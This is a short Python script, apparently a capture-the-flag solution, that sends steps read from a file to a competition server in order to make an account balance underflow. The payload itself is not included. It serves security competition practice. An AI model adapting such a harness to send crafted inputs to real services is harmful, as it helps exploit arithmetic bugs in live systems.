import socket
from time import sleep

URL = "chal.pctf.competitivecyber.club"
PORT = 4444
SLEEP_LEN = 0.5


def parse_steps(fname: str):
    with open(fname, "r") as file:
        fc = file.read().split("\n")

        # filter out comment lines
        fc = filter(lambda x: len(x) != 0 and x[0] != "#", fc)
        fc = "\n".join(fc)

        # plus signs = inline newlines
        return fc.replace("+", "\n")


def connect():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((URL, PORT))

    return client_socket


def send(msg: str):
    conn.send(msg.encode())


def run_steps(steps: str):
    steps = parse_steps(steps)

    send(steps)
    sleep(SLEEP_LEN)
    return conn.recv(16384)


try:
    conn = connect()

    # get balance to underflow
    res = run_steps("1_spam_tips.txt")
    print(res.decode())

    # Close the socket
    conn.close()
except Exception as e:
    print(f"Error: {e}")
